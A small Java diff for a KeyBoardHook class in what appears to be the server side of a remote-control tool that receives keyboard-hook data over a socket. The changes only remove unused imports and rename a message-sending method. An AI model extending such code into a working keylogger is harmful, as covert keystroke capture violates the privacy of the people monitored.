@@ -1,6 +1,5 @@
 package me.server.receive;
 
-import com.sun.jna.platform.WindowUtils;
 import me.server.Server;
 import me.server.utils.MessageFlags;
 import me.server.utils.SendMessage;
@@ -12,9 +11,6 @@ import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.io.InputStream;
 import java.net.Socket;
-import java.text.DateFormat;
-import java.text.SimpleDateFormat;
-import java.util.Date;
 
 public class KeyBoardHook{
     Socket socket;
@@ -44,7 +40,7 @@ public class KeyBoardHook{
         frame1.addWindowListener(new WindowAdapter() {
             @Override
             public void windowClosing(WindowEvent e) {
-                SendMessage.SendHead(MessageFlags.CLOSE_KEYBORAD,socket);
+                SendMessage.sendHead(MessageFlags.CLOSE_KEYBORAD,socket);
             }
         });
     }
